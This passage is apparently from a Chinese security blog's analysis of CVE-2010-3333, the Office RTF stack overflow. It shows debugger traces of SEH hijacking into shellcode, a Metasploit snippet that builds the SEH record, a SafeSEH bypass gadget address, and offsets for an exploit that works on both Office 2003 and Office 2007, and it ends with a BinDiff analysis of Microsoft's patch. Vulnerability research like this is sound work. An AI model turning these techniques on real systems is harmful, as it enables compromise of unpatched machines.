class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line">Breakpoint <span class="number">6</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出异常处理函数返回地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e4  7c9232a8 001234cc 0012ffb0 001234e8</span><br><span class="line">001233f4  001234a0 0012ffb0 7c9232bc 0012ffb0</span><br><span class="line"><span class="number">00123404</span>  001234b4 7c92327a 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123414</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123424</span>  001234cc 0012ffb0 7c94a9ef 001234cc</span><br><span class="line"><span class="number">00123434</span>  0012ffb0 001234e8 001234a0 30001bdd</span><br><span class="line"><span class="number">00123444</span>  <span class="number">00130000</span> 001234cc 1104c830 <span class="number">00000000</span></span><br><span class="line"><span class="number">00123454</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=7c9232a8 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bde <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bde</span>:</span><br><span class="line">30001bde <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出第一个参数,_EXCEPTION_RECORD结构体指针</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdf <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdf</span>:</span><br><span class="line">30001bdf c3              <span class="keyword">ret</span> &lt;---- 返回到第二个参数(<span class="number">0x0012ffb0</span>,ERR地址),也就是ERR-&gt;Next的内容形成的指令</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb0 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb0 eb06            <span class="keyword">jmp</span>     0012ffb8 &lt;---- (<span class="keyword">jmp</span> short,<span class="number">0x0012ffb8</span>-<span class="number">0x0012ffb2</span>=<span class="number">0x06</span>,其<span class="number">16</span>进制补码也为<span class="number">0x06</span>,目的地址与当前指令的下一条指令的地址之差)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb8 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb8 e91f38ffff      <span class="keyword">jmp</span>     001237dc &lt;---- (<span class="keyword">jmp</span> <span class="built_in">near</span>,<span class="number">0x001237dc</span>-<span class="number">0x0012ffbd</span>=-<span class="number">51169</span>,其<span class="number">16</span>进制补码为<span class="number">0xFFFF381F</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=001237dc <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">001237dc b8e69036d6      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="number">0D63690E6h</span> &lt;---- Shellcode第一条指令</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如上所述，我们已经分析了<code>覆盖SEH记录</code>，以及<code>发生异常</code>后，系统是怎样调用<code>SEH异常处理程序</code>的，还有通过<code>pop/pop/ret</code>形式的<code>ROPGadget</code>跳转到栈上构造的<code>用于跳转到Shellcode的指令</code>去执行，最终跳转到<code>Shellcode</code>执行。</p><p>&emsp;&emsp;<code>此过程</code>可以简化为<code>下图</code>所示：</p><p><img src="/resources/2020/CVE-2010-3333/覆盖SEH劫持控制流示意图.png" alt="覆盖SEH劫持控制流示意图"></p><p>&emsp;&emsp;<code>msf</code>中提供的<code>漏洞利用模块</code>就是使用<code>覆盖SEH记录</code>达成控制流劫持的。其中如下部分，就是<code>关键部分</code>，用于构建上图中的<code>4，5两步骤</code>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_target</span><span class="params">(rest, targ)</span></span></span><br><span class="line">    targ[<span class="string">'Offsets'</span>].each &#123; <span class="params">|off|</span></span><br><span class="line">        <span class="comment"># Rex::Exploitation::Seh</span></span><br><span class="line">        seh = generate_seh_record(targ.ret) <span class="comment"># 生成SEH记录,"\xeb\x06xxxx",jmp short $+0x06</span></span><br><span class="line">        rest[off, seh.length] = seh</span><br><span class="line">        distance = off + seh.length</span><br><span class="line">        <span class="comment"># jmp near $-,e9xxxxxxxx,SEH记录之后，用于跳转到Shellcode执行的指令</span></span><br><span class="line">        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, <span class="string">"jmp $-"</span> + distance.to_s).encode_string</span><br><span class="line">        rest[off + seh.length, jmp_back.length] = jmp_back</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;在<code>Windows7</code>中，已经引入了SEH校验机制<code>SafeSEH</code>。所以我们需要在<code>未启用SafeSEH机制</code>的模块中寻找<code>POP/POP/RET</code>形式的<code>ROPGadget</code>，来<code>bypass SafeSEH</code>。通过<code>mona</code>插件，我们可以知道<code>msxml5.dll</code>并未启用<code>SafeSEH机制</code>，而且在其中找到了<code>POP/POP/RET</code>形式的ROPGadget，其位于地址<code>0x78812890</code>处。</p><h3 id="0x43-Office2003和Office2007-Exploit的通用性"><a href="#0x43-Office2003和Office2007-Exploit的通用性" class="headerlink" title="0x43 Office2003和Office2007 Exploit的通用性"></a>0x43 Office2003和Office2007 Exploit的通用性</h3><p>&emsp;&emsp;在前面通过<code>覆盖返回地址</code>劫持控制流的方法中，因为<code>XP&amp;Office2003</code>和<code>Win7&amp;Office2007</code>的环境下，<code>Office2003</code>和<code>Office2007</code>的<code>Word.exe</code>都是<code>未启用DEP</code>的，所以都可以通过<code>覆盖返回地址</code>，在<code>栈</code>上执行<code>Shellcode</code>。而在<code>Windows7</code>中是支持<code>映像ASLR</code>的，所以需要在<code>未启用ASLR</code>的模块中，寻找<code>“jmp esp”</code>形式的<code>ROPGadget</code>。如果可以找到在两种环境下<code>通用的ROPGadget</code>，就可以实现<code>Exploit的通用性</code>。</p><p>&emsp;&emsp;对于通过<code>覆盖SEH记录</code>劫持控制流的方法，我们需要关心的是<code>当前环境</code>是否启用<code>SafeSEH</code>和<code>SEHOP</code>。<code>Windows XP</code>是不支持<code>SEHOP</code>的，虽然<code>Windows7</code>支持<code>SEHOP</code>，但是其默认是<code>关闭</code>的。而<code>SafeSEH</code>在<code>Windows XP</code>和<code>Windows7</code>上都是支持的，所以我们需要<code>bypass SafeSEH</code>。这里使用的方法就是利用<code>未启用SafeSEH的模块</code>bypass SafeSEH，我们需要在<code>未启用SafeSEH的模块</code>中找到用于<code>SEH劫持</code>的<code>POP/POP/RET</code>形式的<code>ROPGadget</code>。如果模块<code>未启用SafeSEH</code>，并且该模块不是仅包含<code>中间语言</code>(IL,.Net编译)，这个异常处理就<code>可以被执行</code>。</p><p>&emsp;&emsp;在<code>XP&amp;Office2003</code>环境下，pFragments缓冲区起始地址为<code>0x001237dc</code>，栈底为<code>0x00130000</code>，0x00130000-0x001237dc=<code>0xc824</code>。在<code>Win7&amp;Office2007</code>的环境下，pFragments缓冲区起始地址为<code>0x0011fdf4</code>，栈底为<code>0x00130000</code>，0x00130000-0x0011fdf4=<code>0x1020c(关闭ASLR)</code>。<code>未关闭ASLR</code>的情况下，都是<code>大于0x10000</code>的。msf样本生成脚本中，使用的<code>复制数据长度</code>为<code>0xc8ac</code>，这也是为什么用msf生成的样本在<code>XP&amp;Office2003</code>环境下，<code>复制过程中</code>就会触发<code>内存访问异常</code>，而在<code>Win7&amp;Office2007</code>的环境下，<code>数据复制完成</code>后，对<code>已经覆盖的栈数据</code>进行访问时才触发<code>内存访问异常</code>。发生异常的原因，和<code>“覆盖返回地址”</code>节的一样，<code>sub_30F0B5C2</code>(Office2003)/<code>sub_32E5955E</code>(Office2007)的<code>第5个参数</code>未被修改为<code>0x0</code>，<code>sub_30F0B5C2</code>/<code>sub_32E5955E</code>返回前对<code>已覆盖的栈数据</code>进行访问，造成<code>异常</code>。</p><p>&emsp;&emsp;<code>“漏洞战争”</code>中，<code>泉哥</code>提供的思路是<code>Office2003</code>通过<code>覆盖返回地址</code>进行漏洞利用，被利用来<code>覆盖返回地址的地址</code>是<code>0x0026762f</code>，在<code>Office2003</code>下是<code>“call esp”</code>的地址，该地址适用于<code>Office2003 SP0-SP3</code>等各个子版本，属于稳定的跳转地址。而在<code>Office2007</code>中，<code>0x0026762f</code>已不再是call/jmp esp形式的指令，但是用此地址覆盖<code>Office2007</code>中<code>关键函数sub_32E5955E</code>的<code>返回地址</code>，会造成<code>异常</code>，继而转入<code>SEH异常处理程序</code>。我们只需要同时覆盖<code>Office2007</code>环境下栈中最近的<code>SEH记录</code>，就可以劫持SEH异常处理程序。</p><p><img src="/resources/2020/CVE-2010-3333/通用Exploit的栈布局.png" alt="通用Exploit的栈布局"></p><p>&emsp;&emsp;在<code>msf漏洞利用模块</code>中，<code>Targets</code>中有一个<code>“Automatic”</code>选项，其作用是将<code>多个环境</code>的<code>相关Target数据</code>糅合到<code>一个样本</code>中，达到<code>Exploit的通用性</code>。因为<code>msf漏洞利用模块</code>对于所有环境，使用的都是<code>覆盖SEH记录</code>进行漏洞利用，而不同环境下<code>SEH记录</code>距<code>缓冲区起始地址</code>的<code>Offset</code>各不相同，所以很少会出现<code>数据冲突</code>的情况。</p><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p><p>&emsp;&emsp;既然要分析<code>这个漏洞</code>官方是<code>怎么修复</code>的，首先要找到<code>此漏洞对应的补丁</code>。由于漏洞年代久远，<code>Microsoft的网站</code>又发生了很大的改变，<code>补丁的下载页面</code>已经找不到了，只找到如下<code>两个链接</code>：<br>1、<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">Microsoft 安全公告 MS10-087 - 严重</a><br>2、<a href="https://support.microsoft.com/zh-cn/help/2423930/ms10-087-vulnerabilities-in-microsoft-office-could-allow-remote-code-e" target="_blank" rel="noopener">MS10-087：Microsoft Office 中的漏洞可能允许远程代码执行</a></p><p>&emsp;&emsp;虽然当时的<code>补丁公告页面</code>已经无法下载补丁了，但是我们可以通过官方提供的<a href="https://www.catalog.update.microsoft.com/" target="_blank" rel="noopener">补丁下载站</a>下载指定补丁。我们可以使用<code>KB编号</code>(Knowledge Base:知识库)进行搜索，或者使用此漏洞的<code>微软漏洞编号MS10-087</code>进行搜索就可以了。</p><p>&emsp;&emsp;我下载的是<code>Office2007</code>的补丁。我的分析环境中使用的是<code>Office2007</code>，未安装任何<code>Service Pack</code>包。如果<code>直接安装</code>这个补丁的话，会提示<code>下图所示错误</code>：</p><p><img src="/resources/2020/CVE-2010-3333/补丁安装错误.png" alt="补丁安装错误"></p><p>&emsp;&emsp;这里提示说有<code>两个原因</code>，<code>原因一</code>是升级修补程序可能更新的是不同版本的程序，也就是说，我们<code>安装的版本</code>与<code>补丁检测的版本</code>不匹配。<code>原因二</code>是升级修补程序不正确，也就是说<code>补丁安装程序损坏了</code>。经过思考，<code>第一种</code>的可能性大一点，我又查看了一下<code>此漏洞的公告</code>，公告中说此漏洞影响的是<code>Office2007SP2</code>版本，所以就想到可能是因为我没有安装<code>Office2007SP2升级包</code>。安装完<code>Office2007SP2升级包</code>，此漏洞的补丁就可以安装了。如下是<code>补丁安装前后</code>mso.dll的版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、SP2安装前：12.0.4518.1014</span><br><span class="line">2、SP2安装后：12.0.6425.1000</span><br><span class="line">3、补丁安装后：12.0.6545.5004</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我这里使用的是<code>“12.0.4518.1014”</code>和<code>“12.0.6545.5004”</code>进行对比。这里要吐槽一下<code>BinDiff</code>这个工具，分析实在是太慢了。第一次我是用的是<code>BinDiff4.3&amp;IDA Pro6.8</code>进行分析，结果我电脑开了一晚上也没分析完，<code>前一个漏洞</code>我也是用<code>此版本</code>来分析的，没出现<code>任何问题</code>。我看了一下<code>BinDiff的文档</code>，看到<code>BinDiff4.3</code>是基于<code>IDA SDK6.95</code>的，会不会是因为IDA的版本低了?又看到<code>BinDiff4.2</code>是基于<code>IDA SDK6.8</code>构建的，所以就想<code>BinDiff4.2&amp;IDA Pro6.8</code>的组合应该没问题了吧。开始尝试，经过<code>一段很长的时间</code>，我终于成功了。期间，我还试了<code>BinDiff5&amp;IDA Pro7.2</code>，并未成功，测试的原因是想看看<code>新版本</code>会不会<code>缩短比较的时间</code>。由于<code>此漏洞</code>涉及到的模块<code>mso.dll比较大</code>，生成的<code>idb</code>都在<code>200MB</code>左右，所以需要<code>较长时间</code>，请耐心等待。<code>BinDiff4.3&amp;IDA Pro6.8</code>失败的特征是，<code>BinDiff的进度条</code>一直在显示Diff中，但是<code>BinDiff的进程</code>却在生成<code>.BinDiff</code>文件后，占用<code>很少的CPU</code>，可以分析出<code>BinDiff</code>因为某些原因<code>卡住了</code>，但并未<code>提示错误</code>。</p><p>&emsp;&emsp;之前分析<code>漏洞原因</code>时，<code>关键漏洞函数</code>位于<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数中，通过<code>函数名</code>，我们可以在<code>Matched Functions</code>中快速定位，找到之后，双击，就可以打开<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数与<code>“12.0.6545.5004”</code>版<code>mso.dll</code>中的对应函数<code>sub_32E0239B</code>的<code>FlowGraphs</code>。通过对比<code>代码块</code>，我们可以快速定位到<code>添加补丁代码</code>的位置。下图是两个<code>函数代码块</code>的对比图：</p><div align="left"><img src="/resources/2020/CVE-2010-3333/补丁前后关键函数对比图.png" width="70%" height="50%" alt="补丁前后关键函数对比图"></div><p>&emsp;&emsp;我们在<code>IDA</code>中找到<code>多出来</code>的那部分<code>代码块</code>，对其进行<code>详细分析</code>。结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//补丁前关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E5955E@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327A2549(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *(_DWORD *)v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3);</span><br><span class="line">        result = sub_32E5941B(v15, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6);</span><br><span class="line">        <span class="keyword">if</span> ( result )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E6AEA8(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//补丁后关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E0239B@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327DAFBD(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);<span class="comment">// v7为关键对象首地址</span></span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">83886080</span>;</span><br><span class="line">        <span class="comment">// 这些条件则为补丁代码</span></span><br><span class="line">        <span class="keyword">if</span> ( v7                                     <span class="comment">// 关键对象首地址不为0</span></span><br><span class="line">            &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">48</span>))(v7) &lt;= <span class="number">4</span><span class="comment">// 复制数据长度不能大于4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a4<span class="comment">// 关键对象第一个成员变量&gt;a4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a3<span class="comment">// 关键对象第一个成员变量&gt;a3</span></span><br><span class="line">            &amp;&amp; a3 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; a4 &gt;= <span class="number">0</span></span><br><span class="line">            <span class="comment">// 将pFragments属性数据复制到栈上的虚函数</span></span><br><span class="line">            &amp;&amp; ((*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">28</span>))(v7, &amp;v14, a3),</span><br><span class="line">            (<span class="keyword">unsigned</span> __int8)sub_32E02258(v14, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v16 : <span class="number">0</span>, a6)) )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E197A4(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以看到<code>补丁</code>后的<code>关键函数</code>中只有满足了那个<code>关键if</code>中的<code>很多条件</code>才能执行到将<code>pFragments属性数据</code>复制到<code>栈上</code>的<code>虚函数</code>。因为涉及到了<code>很多虚函数</code>，只是<code>静态分析</code>是不行的，所以要结合<code>动态调试</code>确定<code>虚函数的地址</code>，进而分析<code>虚函数的功能</code>。功能我已经分析完，写在了上面<code>代码的注释</code>中。其中<code>第一个条件</code>就是判断<code>pFragments属性数据长度</code>的。如果pFragments属性数据<code>大于4字节</code>，则不再执行<code>内存复制</code>，直接返回，从而解决了此漏洞。</p><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote><ul><li>1.漏洞战争:软件漏洞分析精要 2.4 CVE-2010-3333 Microsoft RTF栈溢出漏洞</li><li>2.0day安全:软件漏洞分析技术 第3章、第6章、第2篇</li><li>3.加密与解密(第4版) 第8章 Windows下的异常处理</li><li>4.精通Metasploit渗透测试(第2版) 第3章 渗透模块的开发过程</li><li>5.Metasploit渗透测试魔鬼训练营 6.6 针对Office软件的渗透攻击案例——MS10-087安全漏洞</li><li>6.<a href="https://web.archive.org/web/20190708132914/http://www.kleinlercher.at/tools/Windows_Protocols/Word2007RTFSpec9.pdf" target="_blank" rel="noopener">Rich Text Format (RTF) Specification Version 1.9.1</a></li><li>7.<a href="https://www.fireeye.com/blog/threat-research/2016/05/how_rtf_malware_evad.html" target="_blank" rel="noopener">How RTF malware evades static signature-based detection</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack Overflow </tag>
            
            <tag> Windows </tag>
            
            <tag> FileFormat </tag>
            
            <tag> Microsoft Office </tag>
            
            <tag> SEH </tag>
            
            <tag> Rtf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ret2_dl_runtime_resolve详解</title>
      <link href="/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/</url>
